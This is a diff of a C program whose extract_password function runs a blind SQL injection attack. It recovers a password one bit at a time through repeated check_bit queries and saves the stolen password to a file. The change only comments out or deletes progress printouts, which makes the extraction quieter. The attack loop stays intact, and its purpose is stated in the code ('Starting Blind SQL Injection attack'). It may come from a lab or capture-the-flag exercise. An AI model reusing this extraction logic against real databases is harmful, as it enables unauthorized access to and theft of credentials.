@@ -77,7 +77,7 @@ void extract_password() {
     }
 
 
-    printf("Starting Blind SQL Injection attack...\n");
+    //printf("Starting Blind SQL Injection attack...\n");
     int querry_count = 0;
     for (int pos = 1; pos <= MAX_PASSWORD_LENGTH; pos++) {  
         int ascii_value = 0;
@@ -87,24 +87,21 @@ void extract_password() {
             querry_count+=1;
             if (check_bit(pos, bit)) {
                 ascii_value |= (1 << bit);  // Set the bit if it's 1
-                printf("1");
             }
-            printf("0");
         }
-        printf("\n");
 
         // Store extracted character
         password[pos - 1] = (char)ascii_value;
-        printf("Extracted character at position %d: %c (ASCII: %d)\n", pos, password[pos - 1], ascii_value);
+        //printf("Extracted character at position %d: %c (ASCII: %d)\n", pos, password[pos - 1], ascii_value);
 
         // Stop if NULL character is reached (end of password)
         if (ascii_value == 0) break;
     }
-    printf("number of queries sent: %d\n", querry_count);
+    //printf("number of queries sent: %d\n", querry_count);
     // Save extracted password
     fprintf(file, "*%s*", password);
     fclose(file);
-    printf("Extracted Password: %s\n", password);
+    //printf("Extracted Password: %s\n", password);
 }
 
 
